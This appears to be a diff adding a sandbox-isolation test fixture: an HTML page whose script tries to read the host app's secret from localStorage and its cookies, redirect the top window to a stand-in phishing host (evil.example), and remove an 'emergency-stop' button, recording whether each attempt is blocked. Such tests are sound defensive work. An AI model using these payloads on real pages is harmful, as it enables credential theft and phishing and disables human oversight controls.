@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+  <body>
+    <script>
+      const out = {};
+      // Same-origin with the RUNTIME page (documented B5 limitation — the
+      // runtime origin holds no Nova secrets by design):
+      try {
+        out.runtimePageDom = window.parent.document.title;
+      } catch (e) {
+        out.runtimePageDom = "blocked:" + e.name;
+      }
+      // The real boundary — the NOVA app (host) origin:
+      try {
+        out.topDom = window.top.document.title;
+      } catch (e) {
+        out.topDom = "blocked:" + e.name;
+      }
+      try {
+        out.topStorage = window.top.localStorage.getItem("nova_secret");
+      } catch (e) {
+        out.topStorage = "blocked:" + e.name;
+      }
+      try {
+        out.topCookies = window.top.document.cookie;
+      } catch (e) {
+        out.topCookies = "blocked:" + e.name;
+      }
+      try {
+        window.top.location.href = "https://evil.example/phished";
+        out.topNav = "assigned";
+      } catch (e) {
+        out.topNav = "blocked:" + e.name;
+      }
+      try {
+        const b = window.top.document.getElementById("emergency-stop");
+        if (b) b.remove();
+        out.disableStop = "removed";
+      } catch (e) {
+        out.disableStop = "blocked:" + e.name;
+      }
+      window.__maliciousResult = out;
+      // Delayed navigation attempt via an anchor click (target=_top). The
+      // sandboxed frame has no allow-top-navigation, so this is blocked.
+      const a = document.createElement("a");
+      a.href = "https://evil.example/phished";
+      a.target = "_top";
+      a.textContent = "phish";
+      document.body.appendChild(a);
+      setTimeout(() => a.click(), 200);
+    </script>
+  </body>
+</html>
